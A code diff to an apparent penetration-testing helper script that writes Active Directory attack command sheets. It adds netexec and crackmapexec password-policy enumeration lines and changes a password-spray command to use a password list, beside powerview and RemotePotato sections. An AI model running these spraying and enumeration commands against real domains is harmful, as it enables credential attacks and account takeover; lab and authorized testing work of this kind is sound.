@@ -103,12 +103,21 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write(f"faketime -f +7h powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n")
             f.write("\n")
 
+            # Password Policy Enumeration
+            f.write("## Password Policy Enumeration\n")
+            if user and password:
+                f.write(f"netexec smb {target_ip} -u '{user}' -p '{password}' --pass-pol\n")
+                f.write(f"crackmapexec smb {target_ip} -u '{user}' -p '{password}' --pass-pol\n")
+            else:
+                f.write(f"# Requires credentials for password policy enumeration\n")
+            f.write("\n")
+        
         #Password spraying
         f.write("# Password Spray\n")
         if user and password:
             f.write(f"netexec smb {target_ip} -u users.txt -p '{password}' --continue-on-success\n")
         else:
-            f.write(f"netexec smb {target_ip} -u users.txt -p users.txt --continue-on-success\n")
+            f.write(f"netexec smb {target_ip} -u users.txt -p passwords.txt --continue-on-success\n")
         f.write("\n")
 
         #RemotePotato check commands
